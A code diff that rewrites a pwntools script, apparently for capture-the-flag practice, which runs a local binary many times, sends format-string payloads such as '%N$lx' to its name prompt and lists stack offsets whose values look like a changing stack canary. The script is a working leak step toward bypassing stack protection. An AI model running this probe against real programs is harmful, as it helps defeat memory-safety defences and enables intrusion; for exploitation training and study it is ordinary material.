@@ -1,33 +1,31 @@
 from pwn import *
+from sys import argv
 
-offsets = []
-possible = []
-different = []
+if not 2 <= len(argv) <= 4:
+    print("Error: Invalid number of arguments.")
+    print("Correct usage: canary-checker [file] {amount} {repeats}")
+    exit()
 
-amount = input("Scan for: ")
+context.log_level = 'WARN'
 
-for x in range(int(amount)):
-	p = ELF("./canary").process()
-	p.recvuntil("name? ")
-	p.sendline("%" + str(x) + "$lx")
-	value = p.readline().split()[-1].replace("!", "")
-	if value.endswith("00"):
-		offsets.append(str(x))
-		possible.append(value)
+executable = argv[1]
+amount = 25 if not len(argv) > 2 else int(argv[2])
+repeats = 2 if not len(argv) > 3 else int(argv[3])
 
-print("#### Possible ####")
-for x in range(len(offsets)):
-	print(offsets[x] + ": " + possible[x])
+offsets = {}
 
-for x in range(int(amount)):
-	p = ELF("./canary").process()
-	p.recvuntil("name? ")
-	p.sendline("%" + str(x) + "$lx")
-	value = p.readline().split()[-1].replace("!", "")
-	if x in offsets:
-		if possible[offsets.indexof(x)] != value:
-			different.append(x)
+for x in range(repeats):
+    for x in range(int(amount)):
+        p = ELF("./" + executable).process()
+        p.recvuntil("name?")
+        p.sendline("%" + str(x) + "$lx")
+        value = p.readline().split()[-1].replace("!", "")
+        if value.endswith("00"):
+            if x not in offsets:
+                offsets[x] = set()
+            offsets[x].add(value)
 
-print("#### Different ####")
-for x in range(len(different)):
-	print(offsets[x] + ": " + possible[offsets.indexof(x)])
+print("#### Possible Due To Changing Value ####")
+for x in offsets:
+    if len(offsets[x]) == repeats:
+        print(str(x) + ": " + ", ".join(offsets[x]))
